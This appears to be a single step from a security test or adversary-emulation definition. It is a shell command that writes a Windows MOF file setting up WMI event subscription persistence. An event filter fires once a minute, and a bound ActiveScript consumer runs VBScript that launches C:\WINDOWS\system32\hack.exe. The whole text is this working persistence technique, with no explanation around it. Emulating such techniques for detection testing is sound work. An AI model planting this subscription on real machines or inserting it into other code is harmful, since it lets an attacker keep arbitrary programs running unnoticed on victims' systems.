steps.command:
cat <<'EOF' > hack.mof
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $EventFilter
{
    EventNamespace = "Root\\Cimv2";
    Name  = "hack_filter";
    Query = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA \"Win32_LocalTime\" AND TargetInstance.Second = 5";
    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $Consumer
{
    Name = "hack_consumer";
    ScriptingEngine = "VBScript";
    ScriptText = "Set objShell = CreateObject(\"WScript.Shell\")\r\nobjShell.Run \"C:\\WINDOWS\\system32\\hack.exe\"";
};

instance of __FilterToConsumerBinding
{
    Consumer   = $Consumer;
    Filter = $EventFilter;
};
EOF
